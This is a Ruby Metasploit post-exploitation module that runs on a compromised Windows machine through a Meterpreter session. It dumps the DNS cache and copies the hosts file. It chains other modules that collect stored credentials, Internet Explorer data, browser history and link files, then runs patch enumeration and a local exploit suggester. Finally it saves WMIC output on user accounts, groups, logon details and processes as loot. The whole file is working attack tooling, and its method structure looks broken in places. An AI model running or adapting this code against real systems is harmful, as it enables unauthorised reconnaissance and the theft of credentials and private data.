##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class MetasploitModule < Msf::Post

  include Msf::Post::Windows::WMIC

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows_en',
      'Description'   => %q{ This is a simple Module for Windows enumeration.
       The module will execute the wmic commands and save the Output and it will
       also run the others important Post modules.
      	                   },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'M.Samaak (@Wir3Ghost)'],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))

  

  def run  # Run Method for when run command is issued    
    tmpout = ""
    print_status("Running module against #{sysinfo['Computer']}")
    system("echo")
    #Gethering Basic INFO
    info = client.sys.config.sysinfo["OS"]
          print_status("Target Operating System is =>     #{info}")
    arch = client.sys.config.sysinfo["Architecture"]      
          print_status("Target Architecture is =>         #{arch}")
    lne = client.sys.config.sysinfo["System Language"]
          print_status("Target OS language is =>          #{lne}")      
    # check if its admin
    print_status("Current user is :                 #{session.sys.config.getuid}")
    print_warning("Checking if Admin :")
    isadd = is_admin?
    if (isadd)
      print_good("          We are Admin") 
    else 
      print_error("Not Admin access level")
    end
    system("echo >/root/me.rb")
    system("echo windows/gather/checkvm >>/root/me.rb")
    datastore['MACRO'] = '/root/me.rb'
    # syinfo is only on meterpreter sessions
    macro = datastore['MACRO']
    entries = []
    if not ::File.exist?(macro)
      print_error "Resource File does not exists!"
      return
    else
      ::File.open(datastore['MACRO'], "rb").each_line do |line|
        # Empty line
        next if line.strip.length < 1
        # Comment
        next if line[0,1] == "#"
        entries << line.chomp
      end
    end

    if entries
      entries.each do |l|
        values = l.split(" ")
        post_mod = values[0]
        if values.length == 2
          mod_opts = values[1].split(",")
        end
        # Make sure we can handle post module names with or without post in the start
        if post_mod =~ /^post\//
          post_mod.gsub!(/^post\//,"")
        end
        m = framework.post.create(post_mod)

        # Check if a post module was actually initiated
        if m.nil?
          print_error("Post module #{post_mod} could not be initialized!")
          next
        end
        # Set the current session
        s = datastore['SESSION']

        if m.session_compatible?(s.to_i)
          m.datastore['SESSION'] = s
          if mod_opts
            mod_opts.each do |o|
              opt_pair = o.split("=",2)
              print_line("\tSetting Option #{opt_pair[0]} to #{opt_pair[1]}")
              m.datastore[opt_pair[0]] = opt_pair[1]
            end
          end
          m.options.validate(m.datastore)
          m.run_simple(
            'LocalOutput'    => self.user_output
          )
        else
          print_error("Session #{s} is not compatible with #{post_mod}")
        end

      end
      else
        print_error("Resource file was empty!")
      end
      ################################################################################## DNS CHECHES DUMP
      rtable = Rex::Text::Table.new(
      'Header' => 'DNS Cached Entries',
      'Indent' =>  3,
      'Columns' => ['TYPE', 'DOMAIN']
    )

    client.railgun.add_dll('dnsapi') if not client.railgun.get_dll('dnsapi')
    client.railgun.add_function("dnsapi", "DnsGetCacheDataTable", "DWORD", [["PBLOB","cacheEntries","inout"]])
    result = client.railgun.dnsapi.DnsGetCacheDataTable("aaaa")
    address = result['cacheEntries'].unpack('V').first

    while (address != 0 ) do
      struct_pointer = client.railgun.memread(address,10)
      # Get the pointer to the DNS record name
      domain_pointer = struct_pointer[4,4].unpack('V').first
      dns_type = struct_pointer[8,2].unpack('h*')[0].reverse
      # According to the restrictions on valid host names, we read a maximum of 255 characters for each entry
      domain_name = client.railgun.memread(domain_pointer,255).split("\x00\x00").first
      rtable << [dns_type, domain_name]
      # Get the next _DNS_CACHE_ENTRY struct pointer
      address = struct_pointer[0,4].unpack('V').first
    end
    print_status(rtable.to_s)
    system("echo")
    sm = session.fs.file.new("C:\\WINDOWS\\System32\\drivers\\etc\\hosts", "rb")

    # Load up the original hosts file
    buf = ''
    until sm.eof?
      buf << sm.read
    end

    sm.close

    p = store_loot(
      'hosts.confige',
      'text/plain',
      session,
      buf,
      'hosts_file.txt',
      'Windows Hosts File'
    )

    lines = buf.split("\n")

    entries = []
    lines.each do |line|
      next if line =~ /^[\r|\n|#]/
      entries << line
    end

                               # Show results
    if not entries.empty?
      print_status("Downloading the hosts file:")
      entries.each do |e|
        print_good(e.to_s)
      end
    end

    print_status("Hosts file saved: #{p.to_s}")
    system("echo")
    system("echo >/root/me.rb")
    system("echo windows/gather/credentials/credential_collector>>/root/me.rb")
    system("echo windows/gather/enum_ie>>/root/me.rb")
    system("echo windows/gather/forensics/browser_history>>/root/me.rb")      
    system("echo windows/gather/dumplinks>>/root/me.rb")

    datastore['MACRO'] = '/root/me.rb'
    macro = datastore['MACRO']
    entries = []
    if not ::File.exist?(macro)
      print_error "Resource File does not exists!"
      return
    else
      ::File.open(datastore['MACRO'], "rb").each_line do |line|
        # Empty line
        next if line.strip.length < 1
        # Comment
        next if line[0,1] == "#"
        entries << line.chomp
      end
    end

    if entries
      entries.each do |l|
        values = l.split(" ")
        post_mod = values[0]
        if values.length == 2
          mod_opts = values[1].split(",")
        end
        system("echo")
        print_warning("Loading Post Module #{post_mod}")
        if post_mod =~ /^post\//
          post_mod.gsub!(/^post\//,"")
        end
        m = framework.post.create(post_mod)

        if m.nil?
          print_error("Post module #{post_mod} could not be initialized!")
          next
        end
        s = datastore['SESSION']

        if m.session_compatible?(s.to_i)
          m.datastore['SESSION'] = s
          if mod_opts
            mod_opts.each do |o|
              opt_pair = o.split("=",2)
              print_line("\tSetting Option #{opt_pair[0]} to #{opt_pair[1]}")
              m.datastore[opt_pair[0]] = opt_pair[1]
            end
          end
          m.options.validate(m.datastore)
          m.run_simple(
            'LocalOutput'    => self.user_output
          )
        else
          print_error("Session #{s} is not compatible with #{post_mod}")
        end

      end
      else
        print_error("Resource file was empty!")
      end
    system("echo")
    print_warning("Checking the missing enum_patches and Running the Exploit Suggester modue")
    system("echo >/root/me.rb")
    system("echo post/windows/gather/enum_patches >>/root/me.rb")
    system("echo post/multi/recon/local_exploit_suggester >>/root/me.rb")
    datastore['MACRO'] = '/root/me.rb'
    # syinfo is only on meterpreter sessions
    macro = datastore['MACRO']
    entries = []
    if not ::File.exist?(macro)
      print_error "Resource File does not exists!"
      return
    else
      ::File.open(datastore['MACRO'], "rb").each_line do |line|
        # Empty line
        next if line.strip.length < 1
        # Comment
        next if line[0,1] == "#"
        entries << line.chomp
      end
    end

    if entries
      entries.each do |l|
        values = l.split(" ")
        post_mod = values[0]
        if values.length == 2
          mod_opts = values[1].split(",")
        end
        system("echo")
        if post_mod =~ /^post\//
          post_mod.gsub!(/^post\//,"")
        end
        m = framework.post.create(post_mod)

        if m.nil?
          print_error("Post module #{post_mod} could not be initialized!")
          next
        end
        # Set the current session
        s = datastore['SESSION']

        if m.session_compatible?(s.to_i)
          m.datastore['SESSION'] = s
          if mod_opts
            mod_opts.each do |o|
              opt_pair = o.split("=",2)
              print_line("\tSetting Option #{opt_pair[0]} to #{opt_pair[1]}")
              m.datastore[opt_pair[0]] = opt_pair[1]
            end
          end
          m.options.validate(m.datastore)
          m.run_simple(
            'LocalOutput'    => self.user_output
          )
        else
          print_error("Session #{s} is not compatible with #{post_mod}")
        end

      end
      else
        print_error("Resource file was empty!")
      end
####################################################################################################
    system("rm /root/me.rb")
    system("echo")
    system("echo")
                                                   #---------------------WMIC--------------------#
    print_error("    ........Running WMIC Commands........")
    print_line(     "The Output will be save in the txt file ")
    system("echo")
                                                                    #running command wmic useraccount list 1
  print_status("Running WMIC command wmic useraccount list")
      ual = 'useraccount list'
      result = wmic_query(ual)
      store_wmic_loot(result, ual)
                                                                    #running command wmic group list 2
   print_status("Running WMIC command wmic group list")
      wgl = 'group list full'
      result = wmic_query(wgl)
      store_wmic_loot(result, wgl)
                                                          #running command wmic logicaldisk get description,filesystem,name,size 3
  print_status("Running WMIC command wmic logicaldisk get description,filesystem,name,size")
      slb = 'logicaldisk get filesystem,name,size'
      result = wmic_query(slb)
      store_wmic_loot(result, slb)   
                                                                   #running command wmic netlogin get name,lastlogon,badpasswordcount 4
  print_status("Running WMIC command netlogin get name,lastlogon,badpasswordcount")
      lbpd = 'netlogin get name,lastlogon,badpasswordcount'
      result = wmic_query(lbpd)
      store_wmic_loot(result, lbpd)    
                                                                     #running command wmic net clint list 5
  print_status("Running WMIC command netclient list")
      clf = 'netclient list full'
      result = wmic_query(clf)
      store_wmic_loot(result, clf)        
                                                                      #running command wmic nteventlog get path,filename,writeable 6
  print_status("Running WMIC command nteventlog get path,filename,writeable")
      wfp = 'nteventlog get path,filename,writeable'
      result = wmic_query(wfp)
      store_wmic_loot(result, wfp)
                                                                          #running command wmic running command process list 7
  print_status("Running WMIC command process list")
      nclo = 'process list full'
      result = wmic_query(nclo)
      store_wmic_loot(result, nclo) 

  print_status("Running WMIC command bios info ")
      bodl = 'bios'
      result = wmic_query(bodl)
      store_wmic_loot(result, bodl)    
      end 
  end
 def store_wmic_loot(result_text, bodl)
    command_log = store_loot("wmic",
                             "text/plain",
                             session,
                             result_text,
                             "#{bodl.gsub(/\.|\/|\s/,"_")}.txt",
                             "Command Output \'wmic #{bodl.chomp}\'")
    print_good("              Output saved to => #{command_log}")
 end
end
